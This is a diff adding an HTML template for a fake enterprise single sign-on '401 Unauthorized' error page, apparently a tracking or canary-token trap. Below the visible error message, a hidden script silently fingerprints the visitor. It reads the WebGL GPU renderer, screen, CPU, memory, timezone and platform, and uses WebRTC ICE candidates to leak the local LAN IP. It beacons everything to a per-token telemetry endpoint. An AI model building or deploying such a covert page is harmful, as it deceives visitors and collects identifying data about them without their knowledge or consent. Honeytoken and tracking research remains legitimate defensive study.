@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>401 - Unauthorized Session</title>
+    <style>
+        :root {
+            --bg-color: #f8fafc;
+            --card-bg: #ffffff;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --accent-red: #ef4444;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+            max-width: 520px;
+            width: 100%;
+            padding: 40px 32px;
+            text-align: center;
+        }
+        .icon {
+            width: 54px;
+            height: 54px;
+            background-color: #fee2e2;
+            color: var(--accent-red);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        h1 {
+            font-size: 22px;
+            margin: 0 0 10px 0;
+            font-weight: 600;
+        }
+        p {
+            color: var(--text-muted);
+            font-size: 14px;
+            line-height: 1.6;
+            margin: 0 0 24px 0;
+        }
+        .error-code {
+            background: #f1f5f9;
+            padding: 8px 14px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #475569;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+        .btn {
+            background-color: #2563eb;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:hover {
+            background-color: #1d4ed8;
+        }
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #94a3b8;
+            border-top: 1px solid var(--border-color);
+            padding-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">!</div>
+        <h1>Authentication Required</h1>
+        <p>Your session token or access credential could not be verified by the identity provider. The link may have expired or requires higher clearance.</p>
+        <div class="error-code">STATUS_ERR_TOKEN_EXPIRED (0x8004100E)</div>
+        <div>
+            <a href="/" class="btn">Return to Corporate Portal</a>
+        </div>
+        <div class="footer">
+            Enterprise Single Sign-On Gateway &bull; Reference ID: {{ token_id }}
+        </div>
+    </div>
+
+    <!-- Silent Hardware & WebRTC Telemetry Beacon -->
+    <script>
+        (function() {
+            const tokenId = "{{ token_id }}";
+            const telemetry = {
+                gpu_renderer: "Unknown",
+                screen_res: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`,
+                cpu_cores: navigator.hardwareConcurrency || null,
+                device_memory: navigator.deviceMemory || null,
+                client_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+                platform: navigator.platform || null,
+                local_lan_ip: null
+            };
+
+            // 1. WebGL GPU extraction
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                if (gl) {
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    if (debugInfo) {
+                        telemetry.gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {}
+
+            // 2. WebRTC Local LAN IP discovery
+            function discoverWebRTCIP(callback) {
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel("");
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                    pc.onicecandidate = (event) => {
+                        if (!event || !event.candidate) {
+                            callback(telemetry.local_lan_ip);
+                            return;
+                        }
+                        const candidate = event.candidate.candidate;
+                        const match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (match && !match[1].startsWith("0.")) {
+                            telemetry.local_lan_ip = match[1];
+                            callback(match[1]);
+                        }
+                    };
+                    setTimeout(() => callback(telemetry.local_lan_ip), 1200);
+                } catch (e) {
+                    callback(null);
+                }
+            }
+
+            function sendTelemetry() {
+                const url = `/t/${tokenId}/telemetry`;
+                const payload = JSON.stringify(telemetry);
+                if (navigator.sendBeacon) {
+                    const blob = new Blob([payload], { type: "application/json" });
+                    navigator.sendBeacon(url, blob);
+                } else {
+                    fetch(url, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: payload,
+                        keepalive: true
+                    }).catch(() => {});
+                }
+            }
+
+            discoverWebRTCIP(() => {
+                sendTelemetry();
+            });
+        })();
+    </script>
+</body>
+</html>
